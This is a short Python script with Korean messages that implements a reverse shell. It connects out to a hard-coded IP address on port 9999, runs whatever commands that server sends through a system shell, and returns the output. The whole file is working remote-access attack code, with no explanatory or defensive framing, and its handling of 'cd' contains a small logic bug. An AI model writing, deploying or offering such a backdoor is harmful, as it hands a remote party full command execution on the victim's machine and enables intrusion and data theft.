import socket
import subprocess
import os

SERVER_HOST = '61.82.211.183'
SERVER_PORT = 9999

def main():
    sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    try:
        sock.connect((SERVER_HOST, SERVER_PORT))
    except:
        print("서버를 찾을 수 없음")
        return 

    # 서버 응답 기다림
    while True:
        try:
            data = sock.recv(4096)
            if not data: break

            command = data.decode('utf-8').strip()
            if not command or command == 'quit':
                continue
            
            if command.startswith('cd '):
                try:
                    target_dir = command[3:].strip()
                    os.chdir(target_dir)
                    output = f"{os.getcwd()}"
                except FileNotFoundError:
                    output = f"경로를 찾을 수 없음: {target_dir}"

            else:
                proc = subprocess.Popen(
                        command, 
                        shell=True, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE, 
                        stdin=subprocess.PIPE
                )
            stdout_value = proc.stdout.read()
            stderr_value = proc.stderr.read()
            
            try:
                output = (stdout_value + stderr_value).decode('cp949')
            except:
                output = (stdout_value + stderr_value).decode('utf-8', errors='ignore')

            if not output:
                output = "명령어 실행 완료"

            sock.send(output.encode('utf-8'))

        except Exception as e:
            print(f"에러 발생: {e}")
            sock.close()
            break
    
    sock.close()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("접속을 종료합니다.")


